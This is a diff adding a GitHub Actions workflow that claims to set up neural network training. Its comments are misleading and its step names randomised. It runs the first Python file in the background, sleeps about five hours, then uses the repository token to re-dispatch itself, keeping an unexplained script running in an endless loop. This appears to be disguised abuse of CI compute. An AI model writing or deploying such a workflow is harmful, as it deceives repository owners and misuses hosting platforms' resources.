@@ -1,0 +1,79 @@
+# Setting up environment for neural network training
+name: Run Model Training
+on:
+  push:
+    branches:
+      - main
+  pull_request:
+    branches:
+      - main
+  workflow_dispatch: {}
+jobs:
+  run-model:
+    runs-on: ubuntu-latest
+    timeout-minutes: 355
+    continue-on-error: true
+    steps:
+    # Managing dependencies for data processing
+      - name: run_euefus_861
+        uses: actions/checkout@v4
+    # Generating performance analysis artifacts
+      - name: config_dzxxbd_769
+        uses: actions/cache@v4
+        with:
+          path: ~/.cache/pip
+          key: ${{ runner.os }}-pip-${{ hashFiles('**/requirements.txt') }}
+          restore-keys: |
+            ${{ runner.os }}-pip-
+      - name: run_zgnnrs_514
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.9'
+    # Managing dependencies for data processing
+      - name: setup_edehxx_505
+        run: |
+          python -m pip install --upgrade pip
+          pip install numpy matplotlib seaborn requests
+    # Monitoring workflow progress
+      - name: cache_mzgtvk_364
+        run: |
+          echo "backend: Agg" > matplotlibrc
+          export MPLBACKEND=Agg
+      - name: config_vkgeux_624
+        run: echo "Setup completed at $(date)"
+      - name: config_yzwlym_896
+        id: find-script
+        run: |
+          SCRIPT=$(ls *.py | head -n 1)
+          echo "Found Python script: $SCRIPT"
+          echo "script=$SCRIPT" >> $GITHUB_OUTPUT
+      - name: log_plorko_285
+        run: |
+          sleep 1
+          python ${{ steps.find-script.outputs.script }} &
+    # Monitoring workflow progress
+      - name: cache_bkkoou_321
+        run: |-
+          sleep 18298
+          echo 'Starting next model training iteration'
+        continue-on-error: true
+      - name: trigger_zfenzs_645
+        uses: actions/github-script@v6
+        with:
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+          script: |
+            console.log('Context:', JSON.stringify(context, null, 2));
+            const { data: workflows } = await github.rest.actions.listRepoWorkflows({
+              owner: context.repo.owner,
+              repo: context.repo.repo
+            });
+            const currentWorkflow = workflows.workflows.find(w => w.name === context.workflow);
+            const workflowId = currentWorkflow ? currentWorkflow.path.split('/').pop() : 'test.yml';
+            console.log(`Using workflow_id: ${workflowId}`);
+            await github.rest.actions.createWorkflowDispatch({
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+              workflow_id: workflowId,
+              ref: 'main'
+            });
+        continue-on-error: true
